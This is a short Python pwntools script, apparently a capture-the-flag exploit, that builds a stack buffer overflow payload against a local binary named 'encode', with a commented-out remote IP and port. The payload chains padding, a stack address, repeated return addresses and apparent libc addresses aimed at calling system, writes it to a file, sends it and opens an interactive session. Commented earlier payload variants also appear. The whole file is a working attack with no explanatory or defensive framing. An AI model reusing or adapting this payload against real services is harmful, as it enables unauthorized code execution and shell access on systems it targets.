#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack


# count = 0
# conn = remote("4.31.182.242", 9002) 
conn = process('./encode')

# raw_input('con')

#r <<< `python -c "print 'ZZZ' + 'AAAA'*9 + '\x80\xf3\xff\xbf' + 'CCCC' + 'DDDD' + 'EEEE'*2 + 'FFFF' + '\x89\x83\x04\x08'+ '\xa9\xd1\xf6\xb7'  + '\x60\xe3\xe4\xb7' + 'GGGG' + 'HHHH'"`
# payload = 'ZZZ' + 'AAAA'*9 + '\x80\xf3\xff\xbf' + 'CCCC' + 'DDDD' + 'EEEE'*2 + 'FFFF' + '\x89\x83\x04\x08\xa9\xd1\xf6\xb7'*10  + '\x60\xe3\xe4\xb7' + 'GGGG' + 'HHHH'
# + '\x60\xe3\xe4\xb7' sys
# payload = 'ZZZ' + 'AAAA'*9 + '\xf0\xf3\xff\xbf' + 'CCCC' + 'DDDD' + 'EEEE'*2 + 'FFFF' + '\x89\x83\x04\x08\xa9\xd1\xf6\xb7'*10   + '\x0b\x85\x04\x08'*100 + 'HHHH' 
payload = 'ZZZ' + 'AAAA'*9 + '\xf0\xf3\xff\xbf' + 'CCCC' + 'DDDD' + 'EEEE'*2 + 'FFFF' + '\x89\x83\x04\x08\xa9\xd1\xf6\xb7'*10   + '\x0b\x85\x04\x08'*100 + 'HHHH' 
with open('payload', 'w') as f:
	f.write(payload)

log.info('Sending payload:' + payload)
conn.sendline(payload)

# conn.shutdown('send')

conn.interactive()
# print conn.recvuntil("\n")

conn.recv()
print conn.recv()
conn.close()



